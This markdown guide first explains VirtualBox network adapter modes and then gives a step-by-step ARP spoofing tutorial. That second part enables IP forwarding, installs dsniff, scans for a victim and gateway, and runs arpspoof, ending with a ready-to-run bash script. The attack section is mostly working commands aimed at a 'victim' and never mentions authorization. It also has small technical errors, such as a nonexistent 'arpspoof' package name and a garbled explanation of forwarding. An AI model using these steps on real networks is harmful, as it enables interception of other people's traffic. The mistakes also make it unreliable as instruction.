
# VirtualBox network adapters — when to use which

* **NAT (default)**

  * **What you get:** VM has internet via the host’s connection; other devices on your LAN cannot reach the VM.
  * **Use when:** You just need web access inside the VM (updates, browsing, package installs). Simple and safe.
  * **IP behavior:** VM sits behind a VirtualBox NAT with a private IP (typically 10.0.2.x).

* **NAT Network**

  * **What you get:** Like NAT, **plus** multiple VMs can talk to each other on the same private subnet, all with internet access.
  * **Use when:** You’re running multi-VM labs/services that must inter-communicate but don’t need to be reachable from your physical LAN.
  * **IP behavior:** All VMs get addresses from the same VirtualBox NAT network you define.

* **Bridged Adapter**

  * **What you get:** VM connects **directly to your physical LAN** as if it were another real machine.
  * **Use when:** You need the VM to receive an IP from your home/office router and be reachable by other devices on that LAN (e.g., file shares, dev/testing that requires first-class LAN presence).
  * **IP behavior:** VM gets an IP from your LAN’s DHCP (like 192.168.1.x). Appears as a peer on the network.

* **Host-only Adapter**

  * **What you get:** A private network between **host ↔ VM(s)** only. No internet by itself.
  * **Use when:** You want an isolated, safe lab where only your host can reach the VM(s). Good for practicing services or packet capture without touching the real LAN.
  * **IP behavior:** Addresses come from the VirtualBox Host-Only adapter’s DHCP (e.g., 192.168.56.x). You can add a second adapter (NAT) if you also want internet.

* **Internal Network**

  * **What you get:** A fully isolated L2 network **only among VMs** (host not included). No internet.
  * **Use when:** You want multiple VMs to talk only to each other, completely walled off from the host and LAN.
  * **IP behavior:** You provide addressing (static or an internal DHCP server).

* **Generic Driver**

  * **What you get:** Advanced/specialized attachment (e.g., to UDP tunnels or custom backends).
  * **Use when:** You explicitly know you need it for a niche setup. Most users never use this.

* **Not Attached**

  * **What you get:** NIC present but disconnected (link down).
  * **Use when:** You want the OS to see a NIC but keep it offline (for snapshots/tests).

### Quick “which one should I pick?” cheatsheet

* Single VM needs internet only → **NAT**
* Several VMs need to talk + internet, but stay off your real LAN → **NAT Network**
* VM should be a first-class citizen on your LAN (gets router IP, visible to other devices) → **Bridged**
* Safe host↔VM lab, no internet → **Host-only** (optionally add a 2nd **NAT** adapter for updates)
* VMs talk to each other only, not even the host → **Internal Network**

> Tip for packet capture labs: in Adapter settings, **Promiscuous Mode** set to “Allow All” (or “Allow VMs”) can help you observe more L2 traffic inside isolated lab networks.

# ARP Spoofing Steps

## 1. Identify Network Interfaces  
```bash
ip addr show
```
Identify interface connecting to target network (typically `eth0` or similar).

## 2. Enable IP Forwarding for Packet Routing  
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```
This allows packets to pass through linearly without being directly sent to destination.

## 3. Install ARP Spoofing Tool (if not already installed)  
```bash
sudo apt-get install dsniff arpspoof
```

## 4. Find Target IPs (Victim and Gateway)  
```bash
arp -a
# Or use nmap:
nmap -sn 192.168.1.0/24 # Replace with target subnet
```

## 5. Start ARP Poisoning Attack  
```bash
arpspoof -i eth0 -t [VICTIM_IP] [GATEWAY_IP]
```
Replace `[VICTIM_IP]` and `[GATEWAY_IP]` with actual IPs from previous step.

Example:  
```bash
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```

## 6. Stop the ARP Spoofing Process  
When finished, press `Ctrl+C` to terminate:

```bash
^C # Example termination input
```

Full script example (save as `arpspoofer.sh`):
```bash
#!/bin/bash
INTERFACE="eth0"
VICTIM="192.168.1.10"
GATEWAY="192.168.1.1"

echo "[+] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[+] Starting ARP spoofing...."
echo "Press Ctrl-C to stop."
arpspoof -i $INTERFACE -t $VICTIM $GATEWAY
```

Make executable:
```bash
chmod +x arpspoofer.sh
./arpspoofer.sh
```
